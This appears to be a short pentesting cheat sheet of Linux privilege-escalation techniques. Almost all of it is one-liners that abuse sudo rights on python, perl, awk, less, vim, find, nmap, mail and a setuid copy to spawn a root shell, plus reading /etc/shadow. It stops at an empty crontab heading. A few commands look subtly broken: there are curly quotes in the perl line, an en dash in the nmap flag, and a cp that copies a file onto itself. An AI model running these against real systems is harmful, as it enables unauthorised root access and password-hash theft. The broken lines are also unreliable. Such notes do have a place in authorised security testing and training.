# Linux-Exploitation


## Sudoers - Privesc

##### Python
```
sudo -u root /usr/bin/python
>>> from subprocess import call
>>> call(['/bin/bash'])
```

##### Perl
```
sudo -u root /usr/bin/perl -e ‘`/bin/bash`’
```

##### CP + Chmod
```
sudo -u root /bin/cp exploit exploit
sudo -u root /bin/chmod +xs exploit
./exploit
```

##### Awk
```
awk 'BEGIN {system("/bin/bash")}'
```

##### Less
```
Solution 1 - read a file
sudo -u root /usr/bin/less /etc/shadow
 
Solution 2 - create a file
sudo -u root /usr/bin/less 
then insert the following command :
!/bin/bash
```

##### Vim
```
sudo -u victim /usr/bin/vim
then write the following command (same way to quit vim :!q):
:!/bin/bash
```

##### Find
```
sudo -u root /usr/bin/find /bin -name "bash" -exec {} \;
```

##### Bash
```
sudo -u root /bin/bash
```

##### Nmap
```
sudo -u nmap –interactive
nmap>!bash
or
nmap>!sh
```

##### Mail
```
sudo mail --exec='!/bin/bash'
```


## Crontab - Privesc
